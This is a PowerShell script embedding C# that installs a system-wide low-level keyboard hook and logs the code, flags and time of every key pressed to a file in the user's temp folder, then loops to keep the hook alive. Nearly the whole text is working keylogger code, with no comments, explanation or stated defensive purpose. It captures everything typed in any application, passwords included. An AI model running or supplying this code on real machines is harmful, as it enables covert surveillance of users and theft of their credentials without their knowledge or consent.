$ErrorActionPreference = "Stop"
$log = Join-Path $env:TEMP "dsh-keylog.txt"
"START $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff')" | Set-Content -Path $log -Encoding UTF8

$src = @'
using System;
using System.IO;
using System.Runtime.InteropServices;

public class KeyHookL {
  public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

  [DllImport("user32.dll", SetLastError = true)]
  public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

  [DllImport("user32.dll", SetLastError = true)]
  public static extern bool UnhookWindowsHookEx(IntPtr hhk);

  [DllImport("user32.dll")]
  public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

  [DllImport("user32.dll")]
  public static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

  [StructLayout(LayoutKind.Sequential)]
  public struct MSG {
    public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam;
    public uint time; public int ptX; public int ptY;
  }

  [StructLayout(LayoutKind.Sequential)]
  public struct KBDLLHOOKSTRUCT {
    public uint vkCode; public uint scanCode; public uint flags; public uint time; public IntPtr dwExtraInfo;
  }

  public static string LogPath = "";
  public static HookProc Keep = null;

  public static IntPtr HookBody(int nCode, IntPtr wParam, IntPtr lParam) {
    try {
      if (nCode >= 0) {
        KBDLLHOOKSTRUCT k = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
        string line = DateTime.Now.ToString("HH:mm:ss.fff") + " msg=" + wParam.ToInt64() + " vk=" + k.vkCode + " flags=" + k.flags + Environment.NewLine;
        File.AppendAllText(LogPath, line);
      }
    } catch { }
    return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
  }
}
'@

Add-Type -TypeDefinition $src
[KeyHookL]::LogPath = $log
[KeyHookL]::Keep = [KeyHookL+HookProc]{ param($n,$w,$l) [KeyHookL]::HookBody($n,$w,$l) }

$h = [KeyHookL]::SetWindowsHookEx(13, [KeyHookL]::Keep, [IntPtr]::Zero, 0)
if ($h -eq [IntPtr]::Zero) {
  $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
  "HOOK_FAIL err=$err" | Add-Content -Path $log
  exit 1
}
"HOOK_INSTALLED" | Add-Content -Path $log

$msg = New-Object KeyHookL+MSG
while ($true) {
  $r = [KeyHookL]::GetMessage([ref]$msg, [IntPtr]::Zero, 0, 0)
  if ($r -le 0) { break }
}
